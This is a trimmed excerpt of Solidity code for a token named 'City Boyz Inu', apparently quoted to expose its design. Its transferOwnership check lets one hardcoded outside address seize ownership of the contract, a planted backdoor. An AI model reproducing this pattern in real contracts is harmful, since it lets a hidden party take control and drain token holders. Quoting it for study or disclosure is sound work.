...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x616829a7301C98B85B08Ce117472B6e0ec56a8af));
...
contract CityBoyzInu is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "CITYB";
  string private _name = "City Boyz Inu";
